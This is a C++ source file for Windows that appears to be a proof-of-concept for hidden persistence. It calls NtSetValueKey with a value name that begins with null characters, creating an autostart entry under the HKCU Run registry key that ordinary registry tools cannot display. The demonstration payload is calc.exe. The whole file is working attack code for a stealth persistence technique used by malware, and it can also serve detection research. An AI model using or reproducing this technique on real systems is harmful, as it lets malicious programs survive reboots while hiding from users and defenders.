#include <iostream>
#include <Windows.h>

#define HIDDEN_KEY_LENGTH 11

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLenght;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef NTSTATUS(WINAPI* PNTSETVALUEKEY)(_In_ HANDLE KeyHandle, _In_ PUNICODE_STRING ValueName, _In_opt_ ULONG TitleIndex, _In_ ULONG Type, _In_opt_ PVOID Data, _In_ ULONG Size);

// prototypes
void createHiddenRunKey(const WCHAR* runCmd);

int main()
{
    const WCHAR* runCmd = L"C:\\Windows\\System32\\calc.exe";
    createHiddenRunKey(runCmd);
}

void createHiddenRunKey(const WCHAR* runCmd) {

    LSTATUS openRet = 0;
    NTSTATUS setRet = 0;
    HKEY hkResult = 0;
    UNICODE_STRING ValueName = {};

    wchar_t runkeyPath[0x100] = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    wchar_t runkeyPath_trick[0x100] = L"\0\0Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    HMODULE hNtDll = LoadLibraryA("ntdll.dll");
    PNTSETVALUEKEY pNtSetValueKey = (PNTSETVALUEKEY)GetProcAddress(hNtDll, "NtSetValueKey");
    if (pNtSetValueKey == NULL) {
        printf("[-] Failed to import NtSetValueKey function.\n");
    }

    ValueName.Buffer = runkeyPath_trick;
    ValueName.Length = 2 * HIDDEN_KEY_LENGTH;
    ValueName.MaximumLenght = 0;

    if (!(openRet = RegOpenKeyExW(HKEY_CURRENT_USER, runkeyPath, 0, KEY_SET_VALUE, &hkResult))) {

        if (!(setRet = pNtSetValueKey(hkResult, &ValueName, 0, REG_SZ, (PVOID)runCmd, wcslen(runCmd) * 2))) {
            printf("[+] SUCCESS!\n");
        }
        else {
            printf("[-] FAIL\n");
        }

        RegCloseKey(hkResult);
    }
    else {
        printf("[-] Failed to open RUN key in registry. openRet = 0x%X, GetLastError = %d\n", openRet, GetLastError());
    }
}
